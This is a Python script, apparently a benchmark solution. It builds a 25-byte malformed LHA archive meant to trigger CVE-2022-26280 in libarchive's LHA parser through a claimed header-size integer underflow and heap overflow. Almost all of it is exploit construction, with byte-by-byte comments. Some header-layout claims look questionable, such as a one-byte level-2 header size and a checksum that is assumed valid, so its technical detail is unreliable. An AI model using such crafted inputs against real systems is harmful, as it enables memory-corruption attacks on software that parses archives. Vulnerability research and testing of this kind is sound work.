import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This PoC targets CVE-2022-26280 in libarchive's LHA parser.
        # The vulnerability is an integer underflow when calculating the size of
        # the extended header area. The calculation is effectively:
        #   extended_size = declared_header_size - base_header_size
        #
        # By setting the declared_header_size (the first byte of the file) to a
        # very small value (e.g., 0), the result becomes negative. This negative
        # value, when interpreted as an unsigned size_t, becomes a very large
        # positive number. This large size is then passed to a read function,
        # leading to a heap buffer overflow.
        #
        # We construct a minimal LHA level 2 header to trigger this. The base
        # header size for a level 2 archive with a 0-length filename is 25 bytes.
        # The parser needs to successfully read these 25 bytes before performing
        # the vulnerable calculation. Therefore, the minimal PoC is 25 bytes.

        poc = bytearray()

        # Offset 0: Header Size (1 byte)
        # Setting this to 0 triggers the integer underflow.
        poc.append(0x00)

        # Offset 1: Header Checksum (1 byte)
        # With a header size of 0, the checksum calculation loop does not run,
        # so a checksum of 0 is considered valid.
        poc.append(0x00)

        # Offset 2: Method ID (5 bytes)
        poc.extend(b"-lh5-")

        # Offset 7: Compressed Size (4), Original Size (4), Timestamp (4)
        poc.extend(b"\x00" * 12)

        # Offset 19: Attribute (1 byte)
        poc.append(0x00)

        # Offset 20: Level (1 byte)
        # Level 2 is necessary to enter the vulnerable code path.
        poc.append(0x02)

        # Offset 21: Filename Length (1 byte)
        # Set to 0 to create the smallest possible base header.
        poc.append(0x00)

        # Offset 22: Filename (0 bytes)

        # Offset 22: File CRC-16 (2 bytes)
        poc.extend(b"\x00\x00")

        # Offset 24: OS Type (1 byte)
        poc.append(0x00)

        return bytes(poc)